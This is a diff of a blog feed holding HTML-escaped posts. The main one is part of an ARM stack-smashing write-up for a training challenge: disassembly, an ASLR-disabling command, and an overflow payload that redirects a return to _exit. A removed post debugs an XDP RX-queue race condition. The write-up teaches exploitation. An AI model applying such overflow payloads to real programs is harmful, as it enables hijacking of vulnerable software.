+&lt;span class=&quot;p&quot;&gt;.......&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pre&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;---------------&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;---------&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;AAAAAAA&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;BB&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;addr1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CC&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;addr2&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;overflow&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extended&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;---------&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;
+          &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CC&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;addr2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;called&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;without&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;win&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-------------------&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;^&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So now we control where &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt; will return: &lt;code class=&quot;highlighter-rouge&quot;&gt;addr2&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;planning-a-controlled-exit&quot;&gt;Planning a controlled exit&lt;/h2&gt;
+
+&lt;p&gt;An ideal situation would make the program continue running after
+exploiting it, known as
+&lt;a href=&quot;https://azeria-labs.com/process-continuation-shellcode/&quot;&gt;process continuation shellcode&lt;/a&gt;
+but it is too complex for now.&lt;/p&gt;
+
+&lt;p&gt;The simplest thing is to call
+&lt;a href=&quot;https://linux.die.net/man/2/_exit&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;_exit&lt;/code&gt;&lt;/a&gt;
+a thin glib wrapper of &lt;a href=&quot;https://man7.org/linux/man-pages/man2/exit_group.2.html&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exit_group&lt;/code&gt;&lt;/a&gt;
+syscall that exits the process and its threads.&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdisass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_exit&lt;/span&gt;
+ &lt;span class=&quot;err&quot;&gt;►&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb6f1b934&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0xb6f1b938&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0xb6f1b93c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf8&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0xb6f1b940&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;svc&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0xb6f1b944&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;cmn&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0xb6f1b948&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;bhi&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;svc #0&lt;/code&gt; is what it triggers the syscall. In Arm 32bits the
+instruction is &lt;code class=&quot;highlighter-rouge&quot;&gt;swi&lt;/code&gt; but the disassembler renames it to the newer name:
+&lt;em&gt;supervisor call&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;The syscall number is passed to the kernel via &lt;code class=&quot;highlighter-rouge&quot;&gt;r7&lt;/code&gt; as mentioned in &lt;a href=&quot;https://man7.org/linux/man-pages/man2/syscall.2.html&quot;&gt;man
+syscall(2)&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;In our case &lt;a href=&quot;https://github.com/torvalds/linux/blob/v4.17/arch/arm/tools/syscall.tbl#L265&quot;&gt;0xf8 is the syscall number&lt;/a&gt;
+of
+&lt;a href=&quot;https://man7.org/linux/man-pages/man2/exit_group.2.html&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exit_group&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploit-level-2&quot;&gt;Exploit level 2&lt;/h2&gt;
+
+&lt;p&gt;We are going to cheat a little and disable ASLR so we can hardcode
+the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;_exit&lt;/code&gt; (0xb6f1b934)&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;setarch linux32 &lt;span class=&quot;nt&quot;&gt;--addr-no-randomize&lt;/span&gt; /bin/bash
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aslr disabled&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x50\x04\x01\x00BBBB\x34\xb9\xf1\xb6'&lt;/span&gt; | ./stack4
+code flow successfully changed
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aslr disabled&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;
+31
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aslr disabled&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit
+exit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you can see the return code of the process was 31. I corroborated
+with a debugger the value of the registers before the syscall and &lt;code class=&quot;highlighter-rouge&quot;&gt;r0&lt;/code&gt;
+was 31 as expected.&lt;/p&gt;
+
+&lt;p&gt;Instead of jumping to &lt;code class=&quot;highlighter-rouge&quot;&gt;_exit&lt;/code&gt; we could jump before to a piece of code
+–known as gadget– that sets &lt;code class=&quot;highlighter-rouge&quot;&gt;r0&lt;/code&gt; to zero and then jump to &lt;code class=&quot;highlighter-rouge&quot;&gt;_exit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;But that’s for another post.&lt;/p&gt;
+
+&lt;!-- stuff --&gt;
+
+&lt;script&gt;
+function fix_asm_syntax(ev) {
+    // pip install selectq
+    //   cond = (val('text()') == 'blt') | (val('text()') == 'b') | (val('text()').startswith('mov')) | ...
+    //   div = sQ.select('div', attr('class').contains('language-nasm'))
+    //   xpath = div.select('span', cond)
+
+    // Make some instructions &quot;keywords&quot;
+    var xpath = &quot;.//div[contains(@class,'language-nasm')]//span[(((text() = 'blt') or (text() = 'b')) or starts-with(text(), 'mov')) or starts-with(text(), 'ldm') or starts-with(text(), 'stm') or starts-with(text(), 'ldr') or starts-with(text(), 'bx') or starts-with(text(), 'bl') or starts-with(text(), 'bne') or starts-with(text(), 'mvn') or starts-with(text(), 'beq') or starts-with(text(), 'svc') or starts-with(text(), 'cmn') or starts-with(text(), 'bhi')]&quot;;
+    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
+
+    var elems = [];
+    var el = elems_iter.iterateNext();
+    while (el) {
+        elems.push(el);
+        el = elems_iter.iterateNext();
+    }
+    for (var i = 0; i &lt; elems.length; i++) {
+        var el = elems[i];
+        el.classList.add('k'); // keyword
+        el.classList.remove('n'); // noun
+    }
+
+    // Remove the 'err' class
+    var xpath = &quot;.//div[contains(@class,'language-nasm')]//span[@class='err']&quot;
+    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
+
+    var elems = [];
+    var el = elems_iter.iterateNext();
+    while (el) {
+        elems.push(el);
+        el = elems_iter.iterateNext();
+    }
+    for (var i = 0; i &lt; elems.length; i++) {
+        var el = elems[i];
+        el.classList.remove('err'); // syntax error
+    }
+
+    // Remove the 'err' class
+    var xpath = &quot;.//div[contains(@class,'language-python')]//span[@class='err']&quot;
+    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
+
+    var elems = [];
+    var el = elems_iter.iterateNext();
+    while (el) {
+        elems.push(el);
+        el = elems_iter.iterateNext();
+    }
+    for (var i = 0; i &lt; elems.length; i++) {
+        var el = elems[i];
+        el.classList.remove('err'); // syntax error
+    }
+}
+
+document.addEventListener('DOMContentLoaded', fix_asm_syntax);
+&lt;/script&gt;</content><author><name>Gehn</name></author><summary type="html">Fifth challenge with a small introduction to process continuation.</summary></entry><entry><title type="html">Smashing ARM Stack for Fun - Part IV</title><link href="/book-of-gehn/articles/2021/01/19/Smashing-ARM-Stack-for-Fun-Part-IV.html" rel="alternate" type="text/html" title="Smashing ARM Stack for Fun - Part IV" /><published>2021-01-19T00:00:00+01:00</published><updated>2021-01-19T00:00:00+01:00</updated><id>/book-of-gehn/articles/2021/01/19/Smashing-ARM-Stack-for-Fun-Part-IV</id><content type="html" xml:base="/book-of-gehn/articles/2021/01/19/Smashing-ARM-Stack-for-Fun-Part-IV.html">&lt;p&gt;This time the goal is to make the program print the message
 &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;code flow successfully changed&quot;&lt;/code&gt;.&lt;!--more--&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;a-manual-xref&quot;&gt;A manual &lt;code class=&quot;highlighter-rouge&quot;&gt;xref&lt;/code&gt;&lt;/h2&gt;
@@ -2401,381 +2626,4 @@ enough to have the boost.
 &lt;br /&gt;
 Even the person does not need to do anything. The boost can be
 transferred from a group which the person identify herself
-as belonging to.&lt;/figcaption&gt;&lt;/figure&gt;</content><author><name>Gehn</name></author><summary type="html"></summary></entry><entry><title type="html">RC-on-XDP-RX-Queue</title><link href="/book-of-gehn/articles/2020/11/29/RC-on-XDP-RX-Queue.html" rel="alternate" type="text/html" title="RC-on-XDP-RX-Queue" /><published>2020-11-29T00:00:00+01:00</published><updated>2020-11-29T00:00:00+01:00</updated><id>/book-of-gehn/articles/2020/11/29/RC-on-XDP-RX-Queue</id><content type="html" xml:base="/book-of-gehn/articles/2020/11/29/RC-on-XDP-RX-Queue.html">&lt;p&gt;&lt;label for=&quot;mf-482d5a7a07746c31570f73c75afe4260&quot; class=&quot;margin-toggle  in-index-only&quot;&gt;⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mf-482d5a7a07746c31570f73c75afe4260&quot; class=&quot;margin-toggle  in-index-only&quot; /&gt;&lt;span class=&quot;marginnote  in-index-only&quot;&gt;&lt;img style=&quot;max-width:120%;&quot; alt=&quot;RC on RX queue&quot; src=&quot;/book-of-gehn/assets/xdp-rx-rc/rx-rc-queues.png&quot; /&gt;  &lt;br /&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;Picture this: you’d been developing for six months a network sniffer
-using XDP, a kernel &lt;em&gt;in-pass&lt;/em&gt; in Linux.&lt;/p&gt;
-
-&lt;p&gt;Six months and when you are about to release it, you find not one but
-three bugs that shake all your understanding of XDP.&lt;/p&gt;
-
-&lt;p&gt;A debugging race against the clock begins.&lt;!--more--&gt;&lt;/p&gt;
-
-&lt;p&gt;We were hitting three issues in a row:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;RX queue returns addresses with the incorrect offset&lt;/li&gt;
-  &lt;li&gt;More packets hold by the application than possible&lt;/li&gt;
-  &lt;li&gt;Pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt; data&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;All of them at random times but very often.&lt;/p&gt;
-
-&lt;h2 id=&quot;xdp-rx-queue&quot;&gt;XDP RX queue&lt;/h2&gt;
-
-&lt;p&gt;The XDP RX queue is a lock free single-producer, single-consumer queue
-where the kernel plays the role of the producer and the user
-application the consumer.&lt;/p&gt;
-
-&lt;p&gt;The kernel pushes addresses (offsets respect the UMEM’s base address)
-into the queue that points to the received packets.&lt;/p&gt;
-
-&lt;p&gt;The &lt;em&gt;pop&lt;/em&gt; has three parts:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;the user application calls &lt;code class=&quot;highlighter-rouge&quot;&gt;xsk_ring_cons__peek&lt;/code&gt; to know how many
-packets are ready to be consumed.&lt;/li&gt;
-  &lt;li&gt;then, for each one a call to &lt;code class=&quot;highlighter-rouge&quot;&gt;xsk_ring_cons__rx_desc&lt;/code&gt; to get the
-packet’s descriptor and therefore, its address (&lt;code class=&quot;highlighter-rouge&quot;&gt;addr&lt;/code&gt; field)&lt;/li&gt;
-  &lt;li&gt;and finally a call to &lt;code class=&quot;highlighter-rouge&quot;&gt;xsk_ring_cons__release&lt;/code&gt; to mark the descriptors
-free to be reused by the producer.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;There is no need to &lt;em&gt;process&lt;/em&gt; the packets before &lt;code class=&quot;highlighter-rouge&quot;&gt;xsk_ring_cons__release&lt;/code&gt;:
-releasing the packets’ descriptors of the RX does not make the UMEM’s
-frames holding the packets free to be reused.&lt;/p&gt;
-
-&lt;p&gt;Only when the packets’ addresses are pushed into the fill queue (FQ)
-the frames are available again.&lt;/p&gt;
-
-&lt;figure&gt;&lt;figcaption&gt;&lt;span&gt;Addresses of free frames are consumed from the FQ queue by the kernel (1).
-XDP then writes the incoming packet in a free frame (2) and pushes the
-address into the RX queue (3). The user application consumes from the RX
-queue (4) addresses of packets ready to be read or write (5). When it is
-done, the address is pushed back to the FQ for reuse (6).&lt;/span&gt;&lt;/figcaption&gt;&lt;img style=&quot;max-width:80%;&quot; alt=&quot;UMEM cycle&quot; src=&quot;/book-of-gehn/assets/xdp-rx-rc/rx-rc-umem-cycle.png&quot; /&gt;&lt;/figure&gt;
-
-&lt;p&gt;The packet descriptor returned by &lt;code class=&quot;highlighter-rouge&quot;&gt;xsk_ring_cons__rx_desc&lt;/code&gt; has two
-attributes: the packet’s address and its length.&lt;/p&gt;
-
-&lt;p&gt;The address is an &lt;code class=&quot;highlighter-rouge&quot;&gt;uint64_t&lt;/code&gt; offset respect the UMEM’s base address.&lt;/p&gt;
-
-&lt;p&gt;&lt;label for=&quot;mf-e34702a9b002fa12328e1ec2277e184c&quot; class=&quot;margin-toggle &quot;&gt;⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mf-e34702a9b002fa12328e1ec2277e184c&quot; class=&quot;margin-toggle &quot; /&gt;&lt;span class=&quot;marginnote &quot;&gt;&lt;img class=&quot;fullwidth&quot; alt=&quot;UMEM frame&quot; src=&quot;/book-of-gehn/assets/xdp-rx-rc/rx-rc-frame.png&quot; /&gt;  &lt;br /&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;The UMEM is a memory pool divided evenly by 2048 or 4096 bytes, the
-frame size and addresses are aligned to the frame size plus an offset for a
-headroom.&lt;/p&gt;
-
-&lt;p&gt;The headroom is an application defined space reserved at the begin of
-the frame for whatever the user wants to do. By default it’s zero.&lt;/p&gt;
-
-&lt;p&gt;Well, for some reason the RX queue was returning sometimes addresses
-with the wrong offset.&lt;/p&gt;
-
-&lt;h2 id=&quot;more-than-possible&quot;&gt;More than possible&lt;/h2&gt;
-
-&lt;p&gt;The UMEM is a fixed memory pool divided evenly in frames where each
-frame holds a packet.&lt;/p&gt;
-
-&lt;p&gt;Therefore the count of packets that the application can hold
-before releasing them is fixed (UMEM size / frame size).&lt;/p&gt;
-
-&lt;p&gt;At anytime the count is less than or equal to UMEM size / frame size.&lt;/p&gt;
-
-&lt;p&gt;However the counters of the application shown a different thing: more
-packets where entering in the application and were hold before releasing
-them than the expected!&lt;/p&gt;
-
-&lt;h2 id=&quot;pointer-to-null&quot;&gt;Pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt;&lt;/h2&gt;
-
-&lt;p&gt;As mentioned before you can prepend metadata to each packet.&lt;/p&gt;
-
-&lt;p&gt;In our case, one of the attributes is a pointer to an external
-structure and the pointer is never updated again. Remains constant.&lt;/p&gt;
-
-&lt;p&gt;But to our surprise the pointer changes and leaves pointing to &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;And the code is extraordinary simple and straightforward so there is
-no chances to change the pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt; by an error in the logic.&lt;/p&gt;
-
-&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;do_work&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkt_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// pull from the RX queue&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;external_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                 &lt;span class=&quot;c1&quot;&gt;// not NULL&lt;/span&gt;
-
-    &lt;span class=&quot;cm&quot;&gt;/* moments later */&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;field&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// segmentation fault, pkt-&amp;gt;obj is NULL&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;free_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// push into the FQ queue&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No chances.&lt;/p&gt;
-
-&lt;h2 id=&quot;debugging&quot;&gt;Debugging&lt;/h2&gt;
-
-&lt;p&gt;So far we have three unrelated bugs. While possible, it is unlikely that
-we are dealing with three &lt;em&gt;independent&lt;/em&gt; bugs.&lt;/p&gt;
-
-&lt;p&gt;They must be related somehow.&lt;/p&gt;
-
-&lt;p&gt;Let’s spin a debugger.&lt;/p&gt;
-
-&lt;h3 id=&quot;counting-before-a-crash&quot;&gt;Counting before a crash&lt;/h3&gt;
-
-&lt;p&gt;How many packets were pulled from the RX queue before getting one crash.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) b read_packet
-(gdb) ignore 1 1000000
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;When the bug is detected, GDB will stop and we’ll have the chance to see
-how many times the breakpoint was hit before.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) info break
-&amp;lt;...&amp;gt;breakpoint already hit 29 times
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Would this change in function of the UMEM size? Larger UMEMs has more
-frames.&lt;/p&gt;
-
-&lt;p&gt;These are the results:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;// Minimum size, UMEM can hold 1 frame only
-breakpoint already hit 29 times
-breakpoint already hit 19 times
-breakpoint already hit 23 times
-
-// Slightly larger UMEM, it can hold 16 frames
-breakpoint already hit 69 times
-breakpoint already hit 43 times
-breakpoint already hit 50 times
-
-// 64 frames
-breakpoint already hit 111 times
-breakpoint already hit 69 times
-breakpoint already hit 126 times
-
-// 256 frames
-breakpoint already hit 348 times
-breakpoint already hit 324 times
-breakpoint already hit 1 time
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;So, with larger UMEMs is less likely to hit the bug but it is not a hard
-rule. In the last test, with the largest UMEM, we hit the bug in the
-first try.&lt;/p&gt;
-
-&lt;h3 id=&quot;spontaneous-addresses&quot;&gt;Spontaneous addresses&lt;/h3&gt;
-
-&lt;p&gt;What about the addresses returned by the RX queue? We want to print them
-without stopping the process.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) b do_work.c:16     // after the call to read_packet()
-(gdb) commands
-&amp;gt; silent
-&amp;gt; p pkt - umem-&amp;gt;base
-&amp;gt; cont
-&amp;gt; end
-&lt;/code&gt;&lt;/pre&gt;
-
